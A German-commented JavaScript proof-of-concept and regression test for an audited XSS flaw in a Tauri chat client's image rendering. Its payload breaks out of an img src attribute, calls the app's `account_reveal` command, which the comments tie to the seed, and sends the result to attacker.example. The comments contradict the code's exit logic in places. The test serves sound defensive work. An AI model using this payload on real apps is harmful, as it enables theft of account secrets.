// ---------------------------------------------------------------------------
// PoC / Regressionstest für C1 (docs/security/audit-2026-08-20.md):
// XSS über server-kontrollierte Bilddaten in der Chat-Antwort.
//
// Reproduziert die EXAKTE Rendering-Logik aus public/index.html:1018-1035
// (imgSrc + imagesHtml). Ein bösartiger scrai-server liefert `images[].data`
// mit einem `"`-Ausbruch aus dem src-Attribut → injizierter onerror-Handler,
// der im Tauri-Webview `window.__TAURI__.core.invoke('account_reveal')` aufruft.
//
// Ausführen:  node test/security/xss-image-payload.test.mjs
// GRÜN (Test besteht) = die Lücke existiert noch. Nach dem Fix muss der Test
// FEHLSCHLAGEN — dann ist die Injektion neutralisiert.
// ---------------------------------------------------------------------------

import assert from "node:assert";

// --- verbatim aus public/index.html:1018-1041 (bei Fix dort mit-anpassen) ---
const IMG_MIME = { "image/png":"png", "image/jpeg":"jpg", "image/jpg":"jpg", "image/webp":"webp", "image/gif":"gif" };
const B64_ONLY = /^[A-Za-z0-9+/=\s]*$/;
function imgSrc(im){
  const mime = IMG_MIME[im.mimeType] ? im.mimeType : "image/jpeg";
  const data = (typeof im.data === "string" && B64_ONLY.test(im.data)) ? im.data : "";
  return `data:${mime};base64,${data}`;
}
function imagesHtml(imgs, mi){
  return `<div class="imgs">`+imgs.map((im,i)=>{
    const src=imgSrc(im);
    return `<figure class="genimg">
      <img src="${src}" alt="generated image" onload="imgSettled()">
      <button class="dl" title="Save image" onclick="event.stopPropagation();saveImageAt(${mi},${i})">⬇ save</button>
    </figure>`;
  }).join("")+`</div>`;
}
// ---------------------------------------------------------------------------

// Was ein bösartiger Server in seiner chat-Antwort (evt.images) zurückgibt:
const maliciousServerReply = {
  images: [{
    mimeType: "image/png",
    data: `x" onerror="window.__TAURI__.core.invoke('account_reveal').then(r=>window.__TAURI__.core.invoke('open_external',{url:'https://attacker.example/?seed='+encodeURIComponent(JSON.stringify(r))}))" data-x="`,
  }],
};

const html = imagesHtml(maliciousServerReply.images, 0);

console.log("Erzeugtes Markup:\n" + html + "\n");

// Beweis der Injektion: ein onerror-Handler, der NICHT aus dem Template stammt
// (das Template hat nur onload="imgSettled()"), erreicht native Tauri-Commands.
const injectedOnerror = /onerror="[^"]*__TAURI__[^"]*"/.test(html);
const reachesAccountReveal = html.includes("invoke('account_reveal')");

try {
  assert.ok(injectedOnerror, "erwartet: injizierter onerror-Handler im src-Attribut-Ausbruch");
  assert.ok(reachesAccountReveal, "erwartet: der injizierte Handler ruft account_reveal auf");
  console.log("❌ VULNERABLE — die Bilddaten brechen aus dem src-Attribut aus und");
  console.log("   der injizierte onerror ruft account_reveal (Seed) über nativen invoke auf.");
  console.log("   → Finding C1 ist NICHT gefixt.");
  process.exit(1); // non-zero: die Lücke besteht → CI soll das als Alarm werten
} catch (e) {
  console.log("✅ SAFE — kein Attribut-Ausbruch mehr möglich: " + e.message);
  process.exit(0);
}
